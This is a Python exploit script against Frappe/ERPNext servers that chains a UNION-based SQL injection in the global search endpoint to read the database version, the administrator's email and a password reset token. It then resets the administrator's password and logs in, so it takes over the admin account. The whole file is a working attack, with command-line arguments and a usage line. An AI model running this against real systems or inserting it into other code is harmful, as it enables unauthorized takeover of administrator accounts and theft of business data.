import sys, requests, argparse, re

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def inject(ip, payload):
	target = "http://%s/" % ip
	data = {"cmd": "frappe.utils.global_search.web_search",
			"text": "Text",
			"scope": "Scope\" UNION ALL SELECT 1,2,3,4,%s#" % payload
	}
	req = s.post(target, data)
	res = req.text
	if req.status_code == 200:
		return res
	else:
		print("[!] Unexpected error.")

def getToken(ip, email):
	target = "http://%s/" % ip
	data = {'cmd': 'frappe.core.doctype.user.user.reset_password',
			'user': email}
	s.post(target, data)

def passwordReset(ip, token):
	target = "http://%s/" % ip
	newpass = "NewPass@123"
	data = {'key': token,
			'old_password': '',
			'new_password': newpass,
			'logout_all_sessions': '1',
			'cmd': 'frappe.core.doctype.user.user.update_password'}
	req = s.post(target, data)
	res = req.text
	if req.status_code == 200:
		match = re.search(r'"full_name":"([^"]*)",', res)
		username = match.group(1)
		print("\n[+] Password %s defined for user %s" % (newpass, username))
		return newpass
	else:
		print("\n[!] Unexpected error.")

def authenticate(ip, email, passwd):
	target = "http://%s/" % ip
	data = {'cmd': 'login',
			'usr': email,
			'pwd': passwd,
			'device': 'desktop'}
	req = s.post(target, data)
	res = req.text
	if req.status_code == 200:
		print("\n[+] Authentication succeeded!")
	else:
		print("\n[!] Authentication failed.")

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.5:8000 --lhost 192.168.0.1 --lport 8000" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	args = parser.parse_args()
	ip = args.ip

	print("\n[+] Database version")
	payload = "version()"
	db = inject(ip, payload)
	match = re.search(r'"route":"([^"]*)",', db)
	if match:
		print(match.group(1))
	print("\n[+] Administrator username")
	payload = "name COLLATE utf8mb4_general_ci FROM __Auth"
	adminuser = inject(ip, payload)
	match = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', adminuser)
	if match:
		adminuser = match[0]
		print(adminuser)
	print("\n[+] Requesting password reset token...")
	getToken(ip, adminuser)
	print("\n[+] Password reset token")
	payload = "reset_password_key COLLATE utf8mb4_general_ci FROM tabUser"
	token = inject(ip, payload)
	match = re.search(r'"route":"(\w+)"', token)
	if match:
		token = match.group(1)
		print(token)
	passwd = passwordReset(ip, token)
	authenticate(ip, adminuser, passwd)

if __name__ == "__main__":
	main()
